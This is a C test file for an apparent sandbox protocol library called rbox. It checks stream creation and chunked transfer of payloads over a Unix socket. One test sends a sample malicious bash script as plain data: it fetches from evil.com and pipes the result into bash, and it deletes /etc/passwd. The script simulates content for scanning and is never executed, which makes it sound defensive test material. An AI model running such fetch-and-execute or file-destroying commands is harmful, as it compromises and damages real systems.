/*
 * test_streaming.c - Tests for chunked transfer streaming
 * 
 * Tests:
 * 1. Stream creation/destruction
 * 2. Chunked large payload - send 1MB via 32KB chunks
 * 3. Chunked malicious scan - large payload simulating malicious content
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/poll.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>

#include "rbox_protocol.h"

static int pass_count = 0;
static int test_count = 0;

#define RUN_TEST(fn, name) do { \
    test_count++; \
    printf("  Testing: %s...\n", name); \
    fflush(stdout); \
    if (fn() == 0) { printf("    PASS\n"); pass_count++; } \
    else { printf("    FAIL\n"); } \
    fflush(stdout); \
} while(0)

#define TEST_ERROR(fmt, ...) fprintf(stderr, "ERROR: " fmt "\n", ##__VA_ARGS__)

static int wait_for_server(const char *path, int timeout_ms) {
    int interval = 50;
    int elapsed = 0;
    while (elapsed < timeout_ms) {
        struct stat st;
        if (stat(path, &st) == 0 && S_ISSOCK(st.st_mode)) {
            return 0;
        }
        usleep(interval * 1000);
        elapsed += interval;
    }
    return -1;
}

typedef struct {
    const char *path;
    rbox_server_handle_t *srv;
    pthread_mutex_t mutex;
    int server_ready;
} worker_ctx_t;

static void *server_worker_streaming(void *arg) {
    worker_ctx_t *ctx = arg;

    ctx->srv = rbox_server_handle_new(ctx->path);
    if (!ctx->srv) return NULL;

    rbox_server_handle_listen(ctx->srv);
    rbox_server_start(ctx->srv);

    pthread_mutex_lock(&ctx->mutex);
    ctx->server_ready = 1;
    pthread_mutex_unlock(&ctx->mutex);

    int count = 0;
    while (count < 10) {
        rbox_server_request_t *req = rbox_server_get_request(ctx->srv);
        if (!req) break;
        rbox_server_decide(req, RBOX_DECISION_ALLOW, "ok", 0, 0, NULL, NULL);
        count++;
    }

    rbox_server_handle_free(ctx->srv);
    return NULL;
}

/* Test that stream can be created and freed */
static int test_stream_create(void) {
    rbox_stream_t *stream = rbox_stream_new(NULL, NULL);
    if (!stream) return -1;
    
    uint64_t offset = rbox_stream_offset(stream);
    if (offset != 0) {
        rbox_stream_free(stream);
        return -1;
    }
    
    rbox_stream_free(stream);
    return 0;
}

/* Test chunked large payload - send 1MB via 32KB chunks */
static int test_chunked_large_payload(void) {
    const char *path = "/tmp/rbox_test_chunked_large.sock";
    unlink(path);

    worker_ctx_t ctx = { 
        .path = path, 
        .srv = NULL,
        .mutex = PTHREAD_MUTEX_INITIALIZER,
        .server_ready = 0
    };
    pthread_t tid;
    if (pthread_create(&tid, NULL, server_worker_streaming, &ctx) != 0) return -1;
    if (wait_for_server(path, 2000) != 0) {
        pthread_join(tid, NULL);
        return -1;
    }

    rbox_client_t *cl = rbox_client_connect(path);
    if (!cl) {
        rbox_server_stop(ctx.srv);
        pthread_join(tid, NULL);
        return -1;
    }

    rbox_stream_t *stream = rbox_stream_new(NULL, NULL);
    if (!stream) {
        rbox_client_close(cl);
        rbox_server_stop(ctx.srv);
        pthread_join(tid, NULL);
        return -1;
    }

    size_t total_size = 1024 * 1024;  /* 1MB */
    size_t chunk_size = 32 * 1024;   /* 32KB */
    size_t sent = 0;

    while (sent < total_size) {
        size_t remaining = total_size - sent;
        size_t to_send = (remaining < chunk_size) ? remaining : chunk_size;
        uint32_t flags = 0;

        if (sent == 0) flags |= RBOX_FLAG_FIRST;
        if (sent + to_send >= total_size) flags |= RBOX_FLAG_LAST;

        char *chunk = malloc(to_send);
        if (!chunk) {
            rbox_stream_free(stream);
            rbox_client_close(cl);
            rbox_server_stop(ctx.srv);
            pthread_join(tid, NULL);
            return -1;
        }
        memset(chunk, 'A' + (sent / to_send) % 26, to_send);

        rbox_error_t err = rbox_stream_send_chunk(cl, stream, chunk, to_send, flags, total_size);
        free(chunk);

        if (err != RBOX_OK) {
            rbox_stream_free(stream);
            rbox_client_close(cl);
            rbox_server_stop(ctx.srv);
            pthread_join(tid, NULL);
            return -1;
        }

        sent += to_send;
    }

    rbox_stream_free(stream);
    rbox_client_close(cl);
    rbox_server_stop(ctx.srv);
    pthread_join(tid, NULL);
    unlink(path);

    return 0;
}

/* Test chunked malicious scan - simulate scanning suspicious content */
static int test_chunked_malicious_scan(void) {
    const char *path = "/tmp/rbox_test_malicious.sock";
    unlink(path);

    worker_ctx_t ctx = { 
        .path = path, 
        .srv = NULL,
        .mutex = PTHREAD_MUTEX_INITIALIZER,
        .server_ready = 0
    };
    pthread_t tid;
    if (pthread_create(&tid, NULL, server_worker_streaming, &ctx) != 0) return -1;
    if (wait_for_server(path, 2000) != 0) {
        pthread_join(tid, NULL);
        return -1;
    }

    rbox_client_t *cl = rbox_client_connect(path);
    if (!cl) {
        rbox_server_stop(ctx.srv);
        pthread_join(tid, NULL);
        return -1;
    }

    rbox_stream_t *stream = rbox_stream_new(NULL, NULL);
    if (!stream) {
        rbox_client_close(cl);
        rbox_server_stop(ctx.srv);
        pthread_join(tid, NULL);
        return -1;
    }

    /* Simulate malicious content - suspicious patterns */
    const char *malicious_content = 
        "#!/bin/bash\n"
        "echo 'pwned' > /tmp/pwned.txt\n"
        "curl http://evil.com/malware | bash\n"
        "rm -rf /etc/passwd\n";
    size_t total_size = strlen(malicious_content);
    size_t chunk_size = 32;  /* Small chunks */

    size_t sent = 0;

    while (sent < total_size) {
        size_t remaining = total_size - sent;
        size_t to_send = (remaining < chunk_size) ? remaining : chunk_size;
        uint32_t flags = 0;

        if (sent == 0) flags |= RBOX_FLAG_FIRST;
        if (sent + to_send >= total_size) flags |= RBOX_FLAG_LAST;

        rbox_error_t err = rbox_stream_send_chunk(cl, stream, 
            malicious_content + sent, to_send, flags, total_size);

        if (err != RBOX_OK) {
            rbox_stream_free(stream);
            rbox_client_close(cl);
            rbox_server_stop(ctx.srv);
            pthread_join(tid, NULL);
            return -1;
        }

        sent += to_send;
    }

    rbox_stream_free(stream);
    rbox_client_close(cl);
    rbox_server_stop(ctx.srv);
    pthread_join(tid, NULL);
    unlink(path);

    return 0;
}

int main(void) {
    rbox_init();

    printf("=== Streaming tests ===\n\n");
    fflush(stdout);

    RUN_TEST(test_stream_create, "stream create/destroy");
    RUN_TEST(test_chunked_large_payload, "chunked large payload (1MB)");
    RUN_TEST(test_chunked_malicious_scan, "chunked malicious scan");

    printf("\n=== Results: %d/%d tests passed ===\n", pass_count, test_count);
    fflush(stdout);

    unlink("/tmp/rbox_test_chunked_large.sock");
    unlink("/tmp/rbox_test_malicious.sock");

    return (pass_count == test_count) ? 0 : 1;
}